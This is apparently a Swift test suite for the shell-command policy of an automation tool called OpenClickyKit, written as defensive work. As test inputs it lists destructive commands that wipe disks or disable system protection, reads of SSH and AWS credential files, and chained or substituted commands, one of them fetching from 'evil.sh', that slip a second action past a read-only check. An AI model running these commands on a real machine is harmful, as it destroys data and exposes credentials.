import Testing
import Foundation
@testable import OpenClickyKit

@Suite("Deny-list and command classification")
struct PolicyTests {

    @Test("Catastrophic commands are refused outright", arguments: [
        "rm -rf /",
        "sudo rm -rf / --no-preserve-root",
        "diskutil eraseDisk JHFS+ Blank /dev/disk0",
        "csrutil disable",
        "mkfs.ext4 /dev/disk2",
    ])
    func deniesDestructiveCommands(command: String) {
        #expect(throws: Policy.Violation.self) {
            try Policy.validateShell(command)
        }
    }

    @Test("Ordinary commands pass", arguments: [
        "ls -la ~/Downloads",
        "git status",
        "rm ~/Downloads/old.txt",
        "defaults read com.apple.finder",
    ])
    func allowsOrdinaryCommands(command: String) throws {
        try Policy.validateShell(command)
    }

    @Test("Credential paths are never readable")
    func deniesCredentialReads() {
        #expect(throws: Policy.Violation.self) { try Policy.validateRead(path: "~/.ssh/id_rsa") }
        #expect(throws: Policy.Violation.self) { try Policy.validateRead(path: "~/.aws/credentials") }
        #expect(throws: Never.self) { try Policy.validateRead(path: "~/Documents/notes.txt") }
    }

    @Test("Read-only utilities skip the approval prompt")
    func classifiesReadOnlyCommands() {
        #expect(Policy.isReadOnlyCommand("ls -la"))
        #expect(Policy.isReadOnlyCommand("/bin/cat file.txt"))
        #expect(Policy.isReadOnlyCommand("grep -r foo ."))
        #expect(!Policy.isReadOnlyCommand("rm file.txt"))
        #expect(!Policy.isReadOnlyCommand("git commit -m x"))
    }

    /// The classifier reads only the leading executable, so a chained command
    /// would otherwise be waved through on the strength of its first word.
    @Test("Shell metacharacters defeat the read-only classification", arguments: [
        "ls -la; rm -rf ~/Documents",
        "cat file | tee /etc/hosts",
        "echo hi > ~/.zshrc",
        "ls `rm -rf ~/x`",
        "ls $(curl evil.sh)",
        "ls && shutdown -h now",
    ])
    func chainingForcesMutatingClassification(command: String) {
        #expect(!Policy.isReadOnlyCommand(command))
    }
}
